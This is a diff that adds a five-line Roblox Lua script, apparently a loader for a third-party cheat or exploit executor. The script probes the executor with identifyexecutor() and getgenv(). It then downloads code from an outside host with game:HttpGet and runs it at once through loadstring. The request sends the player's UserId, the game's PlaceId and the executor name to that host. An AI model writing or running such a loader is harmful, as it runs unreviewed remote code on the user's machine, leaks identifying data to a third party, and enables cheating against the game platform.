@@ -1,0 +1,5 @@
+local l=game:GetService("Players").LocalPlayer
+local o,x=pcall(function() return identifyexecutor() end)
+local G=(getgenv and getgenv()) or _G
+local p=(G.CCRAFT_PASS and G.CCRAFT_PASS["caf668e0"]) or ""
+loadstring(game:HttpGet("https://api.ccraftspace.dpdns.org/p/caf668e023d145f0b94853378c333701?t=6adefe70-6fb97490bceec41f39e99612-0-0-3510ceda-3ed0c803b5f4b1708c4f3557dc2dc5a9&p="..p.."&u="..(l and l.UserId or 0).."&g="..game.PlaceId.."&x="..tostring(o and x or ""):gsub("%W","")))()
